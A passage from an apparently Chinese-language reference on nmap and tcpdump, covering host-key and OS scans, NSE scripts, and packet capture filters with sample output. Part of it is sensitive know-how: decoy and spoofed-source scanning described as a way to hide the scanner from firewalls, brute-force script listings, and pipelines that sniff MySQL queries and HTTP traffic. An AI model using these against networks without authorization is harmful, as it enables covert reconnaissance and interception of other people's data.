|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAlgJcaT8/F0Ah+Jq9PifhQ3Bvfh4Nl5/WWiyoF0yIhhKlNnO04Vnbi8Qb39BDVRKaqIrfhgbG3vxfyF3TeSEOoAiXXyCns6Ivl7HUEHVsjHOVu7nwwMqo94CaM1+pUgJtXmbmTWyfWGCm8kGD2xNaxs10uxIcuukBN7jlN2TGyEmOD8QkA+1Dx7XGBjpMZT+DQwmEo72V2taAo3a0UOz9ivAakZ/kysP+PN+Kz106iT3BWMkvQScyt96HAwbq8Z0tO531mz90UGVBS1KqNMtNsLHsXYJnQ3obXUTwo8KvtEvJ1UHDs6QdEP55PiBTVvCS+CbEwZZ9O1yGNfznBWmp4Q==

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds

$ nmap -sT -p22 172.16.0.5 --script=ssh-hostkey --script-args=ssh_hostkey='visual bubble'

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 19:36 CST
NSE: Script Scanning completed.
Nmap scan report for 172.16.0.5
Host is up (0.0017s latency).
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 1024 xumep-dynut-poheh-cenys-dyfyz-tubap-lupoz-fofyd-figuf-timaz-byxox (DSA)
| +--[ DSA 1024]----+
| |    .            |
| |.o   +           |
| |o * + .          |
| |...B o .         |
| |...+o o S        |
| |o o + .o         |
| | o . . o E       |
| |      . +        |
| |       . .       |
| +-----------------+
| 2048 xogok-vykec-zacyg-ruzup-baral-kotyv-latoz-hygyz-hysis-zadun-hyxix (RSA)
| +--[ RSA 2048]----+
| |o. ..            |
| | .o. .           |
| | .o   o          |
| |.+ o   =         |
| |o + . E S        |
| |.  . o .         |
| |    o . .        |
| |     o =.o       |
| |    . +.+o.      |
|_+-----------------+

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds

```

#### 1.5.6. --script-updatedb 更新脚本

```
$ sudo nmap --script-updatedb

Starting Nmap 5.00 ( http://nmap.org ) at 2012-02-02 16:34 CST
NSE: Updating rule database.
NSE script database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.12 seconds

```

### 1.6. OS DETECTION

#### 1.6.1. -O: Enable OS detection 操作系统探测

```
nmap -O -v scanme.nmap.org

```

探测目标主机的操作系统和 tcp 端口

```

[root@cacti ~]# nmap -O 192.168.2.40

Starting Nmap 5.51 ( http://nmap.org ) at 2014-02-11 16:22 HKT
Nmap scan report for 192.168.2.40
Host is up (0.00039s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
MAC Address: 78:E3:B5:90:D0:A8 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista (97%), FreeBSD 6.X (88%)
Aggressive OS guesses: Microsoft Windows Server 2008 (97%), Microsoft Windows Server 2008 Beta 3 (97%), Microsoft Windows 7 Professional (97%), Microsoft Windows Vista SP0 or SP1, Server 2008 SP1, or Windows 7 (97%), Microsoft Windows Vista Business SP1 (91%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Server 2008 (90%), FreeBSD 6.2-RELEASE (88%), FreeBSD 6.3-RELEASE (88%), Microsoft Windows Server 2008 R2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds			

```

### 1.7. OUTPUT

#### 1.7.1. --open: Only show open (or possibly open) ports 操作系统探测

```
nmap -O -v scanme.nmap.org

```

### 1.8. 排除指定的主机

```
1) nmap 192.168.0.* --exclude 192.168.0.100

2) 也可以使用 --excludefile 指定排除的列表

nmap -iL hostlist.txt --excludefile excludelist.txt		

```

### 1.9. 查看本地路由与接口

```

Nmap 中提供了 --iflist 选项来查看本地主机的接口信息与路由信息.

[root@test23 ~]# nmap --iflist

Starting Nmap 5.51 ( http://nmap.org ) at 2017-03-30 14:23 CST
************************INTERFACES************************
DEV     (SHORT)   IP/MASK        TYPE     UP MTU   MAC
lo      (lo)      127.0.0.1/8    loopback up 65536
eth0    (eth0)    10.1.2.23/24   ethernet up 1500  00:50:56:80:04:FA
docker0 (docker0) 172.17.42.1/16 ethernet up 1500  56:84:7A:FE:97:99

**************************ROUTES**************************
DST/MASK       DEV     GATEWAY
10.1.2.0/24    eth0
169.254.0.0/16 eth0
172.17.0.0/16  docker0
0.0.0.0/0      eth0    10.1.2.1

> 指定网口与 IP 地址

1) 在 Nmap 可指定用哪个网口发送数据, -e <interface>选项.

2) Nmap 也可以显式地指定发送的源端 IP 地址, 使用-S <spoofip>选项, nmap 将用指定的 spoofip 作为源端 IP 来发送探测包.

3) Nmap 使用 Decoy(诱骗)方式来掩盖真实的扫描地址,例如-D ip1,ip2,ip3,ip4,ME,这样就会产生多个虚假的 ip 同时对目标机进行探测,其中 ME 代表本机的真实地址,这样对方的防火墙不容易识别出是扫描者的身份.

nmap -F -n -Pn -D192.168.1.100,192.168.1.101,192.168.1.102,ME 192.168.1.1

> 定制探测包

Nmap 提供 --scanflags 选项, 用户可以对需要发送的 TCP 探测包的标志位进行完全的控制.可以使用数字或符号指定 TCP 标志位:URG ACK PSH RST SYN FIN.
例如, --scanflags URGACKPSHRSTSYNFIN 设置了所有标志位,但是这对扫描没有太大用处. 标志位的顺序不重要.

-sN; -sF; -sX (TCP Null，FIN，and Xmas 扫描)

Null 扫描 (-sN)
    不设置任何标志位(tcp 标志头是 0)

FIN 扫描 (-sF)
    只设置 TCP FIN 标志位
Xmas 扫描 (-sX)
    设置 FIN, PSH, 和 URG 标志位

#### nmap scan port shell

#!/bin/bash
#author junun
#This script for scan the port for you commit servers
#
#
server_list=(x.x.x.x x1.x1.x1.x1)
port_list=(5307 5308)
while true ;do
    for i in `seq 0 $[${#server_list[*]}-1]`; do
        nmap -p ${port_list[$i]} ${server_list[$i]} | grep open
        if  [ $? -gt 0 ];then
            for m in {1..3};do
                nmap -p ${port_list[$i]} ${server_list[$i]} | grep open
                if [ $?  -gt 0 ] ;then
                     let result$m=$m
                else
                     break
                fi
                sleep 1
            done
            if [ $result1 -gt 0 -a $result2 -gt 0 -a $result3 -gt 0 ];then
                echo "error port"
            fi
        fi
    done
    sleep 30
done

```

### 1.10. MISC

#### 1.10.1. -6: Enable IPv6 scanning

#### 1.10.2. -A: Enables OS detection and Version detection, Script scanning and Traceroute

```

  $ nmap -A -T4 localhost

Starting Nmap 5.21 ( http://nmap.org ) at 2012-02-02 14:54 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00025s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.8p1 Debian 7ubuntu1 (protocol 2.0)
| ssh-hostkey: 1024 a6:ab:76:a5:fb:80:4e:2c:bc:06:d4:85:ff:22:18:1a (DSA)
|_2048 c7:da:16:7a:e7:01:cc:f0:d2:02:b4:17:52:c9:c2:50 (RSA)
80/tcp   open  http        nginx 1.0.5
|_html-title: 500 Internal Server Error
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 1.4
3000/tcp open  ntop-http   Ntop web interface 4.0.3
9000/tcp open  tcpwrapped
Service Info: OS: Linux

Host script results:
|_nbstat: NetBIOS name: NEO-OPTIPLEX-38, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
|   OS: Unix (Samba 3.5.11)
|   Name: WORKGROUP\Unknown
|_  System time: 2012-02-02 14:54:19 UTC+8

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds

```

### 1.11. Nmap Scripting Engine (NSE)

http://nmap.org/nsedoc/

预置脚本

```
$ ls /usr/share/nmap/scripts
asn-query.nse                http-malware-host.nse    smb-enum-groups.nse
auth-owners.nse              http-open-proxy.nse      smb-enum-processes.nse
auth-spoof.nse               http-passwd.nse          smb-enum-sessions.nse
banner.nse                   http-trace.nse           smb-enum-shares.nse
citrix-brute-xml.nse         http-userdir-enum.nse    smb-enum-users.nse
citrix-enum-apps.nse         iax2-version.nse         smb-os-discovery.nse
citrix-enum-apps-xml.nse     imap-capabilities.nse    smb-psexec.nse
citrix-enum-servers.nse      irc-info.nse             smb-security-mode.nse
citrix-enum-servers-xml.nse  ms-sql-info.nse          smb-server-stats.nse
daytime.nse                  mysql-info.nse           smb-system-info.nse
db2-info.nse                 nbstat.nse               smbv2-enabled.nse
dhcp-discover.nse            nfs-showmount.nse        smtp-commands.nse
dns-random-srcport.nse       ntp-info.nse             smtp-open-relay.nse
dns-random-txid.nse          oracle-sid-brute.nse     smtp-strangeport.nse
dns-recursion.nse            p2p-conficker.nse        sniffer-detect.nse
dns-zone-transfer.nse        pjl-ready-message.nse    snmp-brute.nse
finger.nse                   pop3-brute.nse           snmp-sysdescr.nse
ftp-anon.nse                 pop3-capabilities.nse    socks-open-proxy.nse
ftp-bounce.nse               pptp-version.nse         sql-injection.nse
ftp-brute.nse                realvnc-auth-bypass.nse  ssh-hostkey.nse
html-title.nse               robots.txt.nse           sshv1.nse
http-auth.nse                rpcinfo.nse              ssl-cert.nse
http-date.nse                script.db                sslv2.nse
http-enum.nse                skypev2-version.nse      telnet-brute.nse
http-favicon.nse             smb-brute.nse            upnp-info.nse
http-headers.nse             smb-check-vulns.nse      whois.nse
http-iis-webdav-vuln.nse     smb-enum-domains.nse     x11-access.nse

```

使用所有脚本进行扫描

```
nmap --script all localhost

```

## 2. tcpdump - A powerful tool for network monitoring and data acquisition

**tcpdump**

```

tcpdump -Xnnnps0 -i any port $port and host $host

-nn 选项: 意思是说当 tcpdump 遇到协议号或端口号时,不要将这些号码转换成对应的协议名称或端口名称.
-X 选项: 告诉 tcpdump 命令,需要把协议头和包内容都原原本本的显示出来(tcpdump 会以 16 进制和 ASCII 的形式显示).
-p: 将网卡设置为非混杂模式,有时候不生效.
-s:  抓报长度,一般设置为 0,即 65535 字节,防止包截断.否则默认只抓 68 字节.
-i : 抓指定网口的包
port: 抓指定端口的包
host: 抓指定地址的包

其他常用选项:
-c 选项: 是 Count 的含义,这设置了我们希望 tcpdump 帮我们抓几个包.
-l 选项的作用就是将 tcpdump 的输出变为"行缓冲"方式,这样可以确保 tcpdump 遇到的内容一旦是换行符即将缓冲的内容输出到标准输出,以便于利用管道或重定向方式来进行后续处理.(Linux/UNIX 的标准 I/O 提供了全缓冲、行缓冲和无缓冲三种缓冲方式.标准错误是不带缓冲的,终端设备常为行缓冲,而其他情况默认都是全缓冲的.)
-e: 指定将监听到的数据包链路层的信息打印出来,包括源 mac 和目的 mac,以及网络层的协议.
-w: 指定将监听到的数据包写入文件中保存.

tcpdump 的过滤表达式:

man pcap-filter
你会发现,过滤表达式大体可以分成三种过滤条件: 类型 ,方向和协议,这三种条件的搭配组合就构成了我们的过滤表达式.

tcpdump 支持如下的类型: 
1 host: 指定主机名或 IP 地址,例如'host roclinux.cn'或'host 202.112.18.34'
2 net : 指定网络段,例如'arp net 128.3'或'dst net 128.3'
3 port:  指定端口,'port 20'
4 portrange: 指定端口区域,例如'src or dst portrange 6000-6008'

如果我们没有设置过滤类型,那么默认是 host.

dir:
 src,  dst,  src  or dst, src and dst, ra, ta, addr1, addr2, addr3, and addr4.

proto:

Possible protos are: ether, fddi, tr,  wlan,  ip,  ip6,  arp, rarp, decnet, tcp and udp.

1) 抓取 45 这台主机和 192.168.1.1 或者 192.168.2.1 通讯的包
#tcpdump host 192.168.2.45 and \(192.168.1.1 or 192.168.2.1 \)

2) proto [ expr : size]
proto   => 协议
expr    => 指定数据报偏移量
size     => 从偏移量的位置开始提取多少个字节
如果只设置了 expr,而没有设置 size,则默认提取 1 个字节.比如 ip[2:2],就表示提取出第 3、4 个字节;而 ip[0]则表示提取 ip 协议头的第一个字节.

3) tcp[tcpflags]
只抓 SYN 包
#tcpdump -i eth1 'tcp[tcpflags] = tcp-syn'
抓 SYN, ACK
#tcpdump -i eth1 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0'
抓 RST
#tcpdump -i eth1 'tcp[13] & 4 = 4'
抓 HTTP GET 数据
#tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x5353482D'

### exec

exec 命令: 常用来替代当前 shell 并重新启动一个 shell,换句话说,并没有启动子 shell.
使用这一命令时任何现有环境都将会被清除.
exec 在对文件描述符进行操作的时候,也只有在这时,exec 不会覆盖你当前的 shell 环境.

I/O 重定向通常与 FD 有关,shell 的 FD 通常为 10 个,即 0～9.
常用重定向

&- 关闭标准输出
n&- 表示将 n 号输出关闭

 2>&1 :  2>&1 也就是 FD2＝FD1 ,这里并不是说 FD2 的值等于 FD1 的值,因为 > 是改变送出的数据信道,也就是说把 FD2 的 "数据输出通道" 改为 FD1 的 "数据输出通道".

[j]<>filename
      为了读写"filename", 把文件"filename"打开, 并且将文件描述符"j"分配给它.
      如果文件"filename"不存在, 那么就创建它.
      如果文件描述符"j"没指定, 那默认是 fd 0, stdin.
      这种应用通常是为了写到一个文件中指定的地方.
  exec 3<> File             # 打开"File"并且将 fd 3 分配给它.	

```

### 2.1. 监控网络适配器接口

```
$ sudo tcpdump -n -i eth1

```

### 2.2. 监控主机

**tcpdump host 172.16.5.51**

```
# tcpdump host 172.16.5.51
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
17:49:26.202556 IP 172.16.1.3 > 172.16.5.51: ICMP echo request, id 4, seq 22397, length 40
17:49:26.203002 IP 172.16.5.51 > 172.16.1.3: ICMP echo reply, id 4, seq 22397, length 40

```

### 2.3. 监控 TCP 端口

显示所有到的 FTP 会话

```
# tcpdump -i eth1 'dst 202.40.100.5 and (port 21 or 20)'

```

```
$ tcpdump -n -i eth0 port 80

```

监控网络但排除 SSH 22 端口

```
$ sudo tcpdump -n not dst port 22 and not src port 22

```

显示所有到 192.168.0.5 的 HTTP 会话

```
# tcpdump -ni eth0 'dst 192.168.0.5 and tcp and port http'

```

监控 DNS 的网络流量

```
# tcpdump -i eth0 'udp port 53'

```

### 2.4. 监控协议

```
$ tcpdump -n -i eth0 icmp or arp

```

### 2.5. 输出到文件

```
# tcpdump -n -i eth1 -s 0 -w output.txt src or dst port 80

```

使用 wireshark 分析输出文件，下面地址下载

http://www.wireshark.org/

### 2.6. src / dst

src 监控源

```
# tcpdump -ni eth1 'tcp and src port 3000'

```

dst 监控目的地

```
# tcpdump -ni eth1 'tcp and dst port smtp'		

```

演示 src 与 dst

```

[root@netkiller ~]# tcpdump -ni eth1 'tcp and dst port 3000'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

09:08:11.763041 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [S], seq 2048018668, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:11.763383 IP 219.90.123.138.12047 > 47.90.44.87.hbci: Flags [S], seq 2468955264, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:11.763774 IP 219.90.123.138.27092 > 47.90.44.87.hbci: Flags [S], seq 3069483725, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:11.763855 IP 219.90.123.138.8602 > 47.90.44.87.hbci: Flags [S], seq 2460960642, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:11.764323 IP 219.90.123.138.10480 > 47.90.44.87.hbci: Flags [S], seq 1687488150, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:11.786487 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 1705484229, win 257, length 0
09:08:11.786535 IP 219.90.123.138.12047 > 47.90.44.87.hbci: Flags [.], ack 461089870, win 257, length 0
09:08:11.786543 IP 219.90.123.138.27092 > 47.90.44.87.hbci: Flags [.], ack 2893320938, win 257, length 0
09:08:11.788955 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [P.], seq 0:1025, ack 1, win 257, length 1025
09:08:11.789671 IP 219.90.123.138.10480 > 47.90.44.87.hbci: Flags [.], ack 1815033342, win 257, length 0
09:08:11.789692 IP 219.90.123.138.8602 > 47.90.44.87.hbci: Flags [.], ack 1519500600, win 257, length 0
09:08:11.886937 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 2415, win 257, length 0
09:08:11.889665 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 5215, win 257, length 0
09:08:11.893673 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 8015, win 257, length 0
09:08:11.904151 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 10815, win 257, length 0
09:08:11.904707 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 13615, win 257, length 0
09:08:11.914796 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 17815, win 257, length 0
09:08:11.923904 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 19215, win 257, length 0
09:08:11.979687 IP 219.90.123.138.28270 > 47.90.44.87.hbci: Flags [.], ack 19880, win 254, length 0
09:08:14.761388 IP 219.90.123.138.28461 > 47.90.44.87.hbci: Flags [S], seq 3215826970, win 8192, options [mss 1400,nop,wscale 8,nop,nop,sackOK], length 0
09:08:14.782284 IP 219.90.123.138.28461 > 47.90.44.87.hbci: Flags [.], ack 1574781090, win 257, length 0
^C
21 packets captured
22 packets received by filter
0 packets dropped by kernel
[root@netkiller ~]# tcpdump -ni eth1 'tcp and src port 3000'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

09:08:41.241996 IP 47.90.44.87.hbci > 219.90.123.138.28461: Flags [F.], seq 1574781090, ack 3215826972, win 115, length 0
09:08:41.242395 IP 47.90.44.87.hbci > 219.90.123.138.24925: Flags [S.], seq 1277500664, ack 2163858186, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
09:08:41.242498 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [S.], seq 1906857203, ack 3261786724, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
09:08:41.243081 IP 47.90.44.87.hbci > 219.90.123.138.27152: Flags [S.], seq 3451566690, ack 2095717279, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
09:08:41.243223 IP 47.90.44.87.hbci > 219.90.123.138.25265: Flags [S.], seq 943843868, ack 3740664697, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
09:08:41.243413 IP 47.90.44.87.hbci > 219.90.123.138.27145: Flags [S.], seq 1814275155, ack 3577858982, win 14600, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
09:08:41.247070 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], ack 2048020719, win 147, length 0
09:08:41.436542 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [P.], seq 0:1014, ack 1, win 147, length 1014
09:08:41.436595 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 1014:3814, ack 1, win 147, length 2800
09:08:41.436608 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 3814:6614, ack 1, win 147, length 2800
09:08:41.436613 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 6614:9414, ack 1, win 147, length 2800
09:08:41.436617 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 9414:12214, ack 1, win 147, length 2800
09:08:41.436624 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 12214:13614, ack 1, win 147, length 1400
09:08:41.458774 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 13614:16414, ack 1, win 147, length 2800
09:08:41.461374 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 16414:19214, ack 1, win 147, length 2800
09:08:41.461388 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [P.], seq 19214:19879, ack 1, win 147, length 665
09:08:41.485084 IP 47.90.44.87.hbci > 219.90.123.138.24925: Flags [.], ack 1011, win 130, length 0
09:08:41.485958 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [.], ack 999, win 130, length 0
09:08:41.486888 IP 47.90.44.87.hbci > 219.90.123.138.27152: Flags [.], ack 998, win 130, length 0
09:08:41.487791 IP 47.90.44.87.hbci > 219.90.123.138.25265: Flags [.], ack 1005, win 130, length 0
09:08:41.488224 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [P.], seq 1:139, ack 999, win 130, length 138
09:08:41.488291 IP 47.90.44.87.hbci > 219.90.123.138.27145: Flags [.], ack 983, win 130, length 0
09:08:41.489100 IP 47.90.44.87.hbci > 219.90.123.138.24925: Flags [P.], seq 1:139, ack 1011, win 130, length 138
09:08:41.491998 IP 47.90.44.87.hbci > 219.90.123.138.27152: Flags [P.], seq 1:139, ack 998, win 130, length 138
09:08:41.492653 IP 47.90.44.87.hbci > 219.90.123.138.28270: Flags [.], seq 12214:13614, ack 1, win 147, length 1400
09:08:41.494013 IP 47.90.44.87.hbci > 219.90.123.138.25265: Flags [P.], seq 1:139, ack 1005, win 130, length 138
09:08:41.499825 IP 47.90.44.87.hbci > 219.90.123.138.27145: Flags [P.], seq 1:139, ack 983, win 130, length 138
09:08:41.514427 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [P.], seq 139:277, ack 1980, win 146, length 138
09:08:41.688727 IP 47.90.44.87.hbci > 219.90.123.138.27145: Flags [P.], seq 139:277, ack 2005, win 146, length 138
09:08:41.689548 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [P.], seq 277:415, ack 2998, win 162, length 138
09:08:41.824277 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [P.], seq 415:651, ack 3932, win 178, length 236
09:08:41.824391 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [.], seq 651:3451, ack 3932, win 178, length 2800
09:08:41.824427 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [.], seq 3451:6251, ack 3932, win 178, length 2800
09:08:41.824451 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [.], seq 6251:7651, ack 3932, win 178, length 1400
09:08:41.846233 IP 47.90.44.87.hbci > 219.90.123.138.27571: Flags [P.], seq 7651:8537, ack 3932, win 178, length 886
^C
35 packets captured
36 packets received by filter
0 packets dropped by kernel

# tcpdump -ni any 'tcp and dst host 184.105.206.82 and port 25'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
05:46:31.833762 IP 107.178.142.42.49771 > 184.105.206.82.smtp: Flags [.], ack 231639512, win 229, options [nop,nop,TS val 2464661680 ecr 1677502875], length 0
05:46:31.833826 IP 107.178.142.42.49771 > 184.105.206.82.smtp: Flags [P.], seq 0:21, ack 1, win 229, options [nop,nop,TS val 2464661680 ecr 1677502875], length 21
05:46:32.515302 IP 107.178.142.42.49771 > 184.105.206.82.smtp: Flags [P.], seq 21:52, ack 62, win 229, options [nop,nop,TS val 2464662361 ecr 1677503046], length 31
05:46:32.886948 IP 107.178.142.42.49771 > 184.105.206.82.smtp: Flags [P.], seq 52:80, ack 70, win 229, options [nop,nop,TS val 2464662733 ecr 1677503139], length 28

```

### 2.7. 保存结果

```
tcpdump -w tmp.pcap port not 22
tcpdump -r tmp.pcap -nnA

```

### 2.8. Cisco Discovery Protocol (CDP)

```
$ sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
[sudo] password for neo:
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes
13:51:31.825893 CDPv2, ttl: 180s, checksum: 692 (unverified), length 375
        Device-ID (0x01), length: 7 bytes: '4A3750G'
        Version String (0x05), length: 182 bytes:
          Cisco IOS Software, C3750 Software (C3750-IPBASE-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)
          Copyright (c) 1986-2007 by Cisco Systems, Inc.
          Compiled Thu 19-Jul-07 19:15 by nachen
        Platform (0x06), length: 23 bytes: 'cisco WS-C3750G-24TS-1U'
        Address (0x02), length: 13 bytes: IPv4 (1) 193.168.0.254
        Port-ID (0x03), length: 21 bytes: 'GigabitEthernet1/0/15'
        Capability (0x04), length: 4 bytes: (0x00000029): Router, L2 Switch, IGMP snooping
        Protocol-Hello option (0x08), length: 32 bytes:
        VTP Management Domain (0x09), length: 3 bytes: 'example'
        Native VLAN ID (0x0a), length: 2 bytes: 11
        Duplex (0x0b), length: 1 byte: full
        AVVID trust bitmap (0x12), length: 1 byte: 0x00
        AVVID untrusted ports CoS (0x13), length: 1 byte: 0x00
        Management Addresses (0x16), length: 13 bytes: IPv4 (1) 193.168.0.254
        unknown field type (0x1a), length: 12 bytes:
          0x0000:  0000 0001 0000 0000 ffff ffff
1 packets captured
1 packets received by filter
0 packets dropped by kernel

```

```
$ sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes
13:52:03.451238 CDPv2, ttl: 180s, checksum: 692 (unverified), length 420
        Device-ID (0x01), length: 9 bytes: 'O9-Switch'
        Version String (0x05), length: 248 bytes:
          Cisco IOS Software, C2960S Software (C2960S-UNIVERSALK9-M), Version 12.2(55)SE3, RELEASE SOFTWARE (fc1)
          Technical Support: http://www.cisco.com/techsupport
          Copyright (c) 1986-2011 by Cisco Systems, Inc.
          Compiled Thu 05-May-11 16:56 by prod_rel_team
        Platform (0x06), length: 22 bytes: 'cisco WS-C2960S-48TD-L'
        Address (0x02), length: 4 bytes:
        Port-ID (0x03), length: 20 bytes: 'GigabitEthernet1/0/8'
        Capability (0x04), length: 4 bytes: (0x00000028): L2 Switch, IGMP snooping
        Protocol-Hello option (0x08), length: 32 bytes:
        VTP Management Domain (0x09), length: 0 byte: ''
1 packets captured
3 packets received by filter
0 packets dropped by kernel

```

```
$ sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000' | grep GigabitEthernet
[sudo] password for neo:
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 1500 bytes
        Port-ID (0x03), length: 21 bytes: 'GigabitEthernet1/0/15'
1 packets captured
1 packets received by filter
0 packets dropped by kernel

```

cdpr - Cisco Discovery Protocol Reporter

### 2.9. Flags

每一行中间都有这个包所携带的标志：

```
Flags *		

```

### 2.10. 案例

#### 2.10.1. 监控 80 端口与 icmp,arp

```
$ tcpdump -n -i eth0 port 80 or icmp or arp

```

#### 2.10.2. monitor mysql tcp package

```

#!/bin/bash

tcpdump -i eth0 -s 0 -l -w - dst port 3306 | strings | perl -e '
while(<>) { chomp; next if /^[^ ]+[ ]*$/;
  if(/^(SELECT|UPDATE|DELETE|INSERT|SET|COMMIT|ROLLBACK|CREATE|DROP|ALTER)/i) {
    if (defined $q) { print "$q\n"; }
    $q=$_;
  } else {
    $_ =~ s/^[ \t]+//; $q.=" $_";
  }
}'

```

#### 2.10.3. HTTP 包

```

tcpdump -i eth0 -s 0 -l -w - dst port 80 | strings

```

#### 2.10.4. 显示 SYN、FIN 和 ACK-only 包

显示所有进出 80 端口 IPv4 HTTP 包，也就是只打印包含数据的包。例如：SYN、FIN 包和 ACK-only 包输入：

```

# tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

```

#### 2.10.5. 嗅探 Oracle 错误

```

tcpdump -i eth1 tcp port 1521 -A -s1500 | awk '$1 ~ "ORA-" {i=1;split($1,t,"ORA-");while (i <= NF) {if (i == 1) {printf("%s","ORA-"t[2])}else {printf("%s ",$i)};i++}printf("\n")}'

```

#### 2.10.6. smtp

```

# tcpdump -nni any  -x -X port 25 | more
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes
05:55:43.133217 IP 184.105.206.85.25 > 59.153.146.101.42756: Flags [P.], seq 3205055214:3205055222, ack 3276605059, win 16022, options [nop,nop,TS val 2899843510 ecr 1568241053], length 8
	0x0000:  4500 003c c773 4000 3b06 238b b869 ce55  E..<.s@.;.#..i.U
	0x0010:  3b99 9265 0019 a704 bf09 42ee c34d 0683  ;..e......B..M..
	0x0020:  8018 3e96 1803 0000 0101 080a acd8 19b6  ..>.............
	0x0030:  5d79 759d 3235 3020 4f6b 0d0a 0000 0000  ]yu.250.Ok......
	0x0040:  0000 0000 0000 0000 0000 0000            ............
05:55:43.133247 IP 59.153.146.101.42756 > 184.105.206.85.25: Flags [.], ack 8, win 115, options [nop,nop,TS val 1568241323 ecr 2899843510], length 0
	0x0000:  4500 0034 0478 4000 4006 e18e 3b99 9265  E..4.x@.@...;..e
	0x0010:  b869 ce55 a704 0019 c34d 0683 bf09 42f6  .i.U.....M....B.
	0x0020:  8010 0073 54e4 0000 0101 080a 5d79 76ab  ...sT.......]yv.
	0x0030:  acd8 19b6 0000 0000 0000 0000 0000 0000  ................
	0x0040:  0000 0000                                ....
05:55:43.133321 IP 59.153.146.101.42756 > 184.105.206.85.25: Flags [P.], seq 1:32, ack 8, win 115, options [nop,nop,TS val 1568241323 ecr 2899843510], length 31
	0x0000:  4500 0053 0479 4000 4006 e16e 3b99 9265  E..S.y@.@..n;..e
